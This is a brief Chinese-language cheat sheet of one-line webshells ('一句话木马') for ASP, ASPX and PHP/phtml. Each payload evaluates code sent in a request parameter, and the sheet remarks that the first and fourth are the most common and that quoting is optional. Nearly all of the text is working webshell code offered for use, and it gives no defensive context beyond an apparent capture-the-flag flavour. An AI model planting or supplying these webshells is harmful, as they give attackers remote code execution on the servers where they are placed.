# 一句话木马

最简单的一句话木马：

asp的一句话是：   <%eval request ("pass")%>

aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>

phtml的一句话是:  <script language="php">eval($_POST['flag']);</script>
				<?php @eval($_POST['flag']);?>

第一个和第四个最常用，实测 [ ] 里面不用引号 ‘ ’ 也行。
